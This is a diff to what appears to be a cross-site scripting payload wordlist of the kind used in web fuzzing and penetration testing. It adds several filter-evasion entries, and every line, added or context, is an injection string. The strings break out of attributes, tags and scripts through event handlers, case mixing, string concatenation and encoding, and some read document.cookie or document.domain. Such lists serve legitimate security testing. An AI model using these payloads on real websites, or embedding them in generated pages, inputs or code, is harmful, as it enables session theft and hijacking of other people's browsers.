@@ -1,6 +1,7 @@
 !--" /><script>alert('xss');</script>
 "'/>;</style><script>a=eval;b=alert;a(b(/ XSSPOSED/.source));</script>'">
 "'>alert(1)</Script><Svg><Script/1='
+"'>alert(1)</script><script/1='"
 "'`><p><svg><script>a='hello';javascript:alert(1)//';</script></p>
 "/></a></><img src=1.gif onerror=alert(1)>
 "/><img/onerror= javascript:alert(1) src=xxx:x />
@@ -38,6 +39,7 @@
 "><svg onload=alert(1)>
 "><svg onload=alert(1)>.gif
 "><svg/onload=alert(1)>"@x.y
+"\'-alert(1)//"
 "`'><script> javascript:alert(1)</script>
 "`'><script>%0Cjavascript:alert(1)</script>
 "`'><script>%0djavascript:alert(1)</script>
@@ -68,6 +70,7 @@ $ <ScRipT 5-0*3+9/3=>alert(1)</ScRipT giveanswerhere=?------
 '><img+sRc=l+oNerrOr=alert(document.cookie)+x>
 '><svg/onload=alert`xss`>
 'onload=alert(1)><svg/1='
+(alert)(1)
 (xss"><!--><svg/onload=alert(document.domain)>)
 */</script>'>alert(1)/*<script/1='
 --><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
@@ -666,6 +669,7 @@ Tarun~<"><details/open/ontoggle="jAvAsCrIpT:alert(/xss-by-tarun/)">XXXXX</a>
 a="get";b="URL";c="javascript:";d="alert('xss');";eval(a+b+c+d);
 alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 alert(String.fromCharCode(88,83,83));'))">
+alert.apply(null, [1])
 anythinglr00</script><script>alert(document.domain)</script>uxldz
 attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>"></BODY></HTML>
 attributeName="innerHTML" to="XSS<SCRIPT DEFER>javascript:alert(1)</SCRIPT>"></BODY></HTML>
@@ -735,6 +739,7 @@ javascript:alert();//</title></noscript></noembed></template></style></textarea>
 javascript:alert();//<img src=x:x onerror=alert(1)>\";alert();//";alert();//';alert();//`;alert();// alert();//*/alert();//--></title></textarea></style></noscript></noembed></template></select></script><frame src=javascript:alert()><svg onload=alert()><!--
 javascript:alert(1)//\";alert(1);<!--jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//--><FRAME SRC="javascript:alert(1);"></textarea></style></iframe></noscript></noembed></template></option></select></script><img src=x onerror=alert(1)></title><script>alert(1)</script><img src=0 onerror=alert(1)><img src=x:x onerror=alert(1)> alert(1)//
 javascript:alert/*`/*\/*'/*\"/*"/**/(alert())// alert()//--></template><frame/onload=alert() <img src=x onerror=alert()></style/</title/</textarea/</noscript/</noembed/</script><script>alert()</script>
+javascript:setInterval('ale'+'rt(document.domain)')
 sometext<svg onload=alert(document.domain)>?mimeType=text/html
 window[document.body.innerText.charAt(document.body.innerText.indexOf('a'))+'lert'](1)
 x"</title><img src=x onerror=alert(1)>
